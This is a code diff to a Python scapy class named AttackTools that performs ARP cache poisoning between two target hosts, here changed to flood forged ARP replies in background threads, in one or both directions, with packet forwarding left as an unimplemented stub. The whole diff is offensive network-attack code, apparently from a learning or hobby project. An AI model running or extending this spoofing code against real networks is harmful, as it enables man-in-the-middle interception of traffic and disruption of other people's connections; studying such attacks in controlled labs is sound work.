@@ -1,6 +1,7 @@
 import scapy.layers.l2
 from scapy.all import *
 from DataStructures import Host
+from threading import Thread
 
 
 class AttackTools:
@@ -20,7 +21,7 @@ class AttackTools:
         return arp
 
     @staticmethod
-    def poison_single(attacker: Host, target1: Host, target2: Host, bidirectional: bool, forwarding: bool, flood: bool):
+    def poison(attacker: Host, target1: Host, target2: Host, bidirectional: bool, forwarding: bool, flood: bool):
         # TODO: Add error detection
         arp1 = AttackTools.build_arp_response(attacker, target1, target2)
         if not flood:
@@ -31,18 +32,23 @@ class AttackTools:
             if not flood:
                 sendp(arp2)
 
+        if flood:
+            thread1 = Thread(target=AttackTools.sendp_flood, args=(arp1,))
+            thread1.start()
+
+        if flood and bidirectional:
+            thread2 = Thread(target=AttackTools.sendp_flood, args=(arp2,))
+            thread2.start()
+
         if forwarding:
             # TODO: Implement packet forwarding
             pass
 
+    @staticmethod
+    def sendp_flood(pkt):
         # TODO: Add exit condition
-        if flood and bidirectional:
-            while True:
-                sendp(arp1)
-                sendp(arp2)
+        while True:
+            sendp(pkt)
 
-        elif flood:
-            while True:
-                sendp(arp1)
-
-    # def packet_forwarder(self, attacker: Host, target1: Host, target2: Host, bidirectional: bool):
+    def packet_forwarder(self, attacker: Host, target1: Host, target2: Host, bidirectional: bool):
+        pass
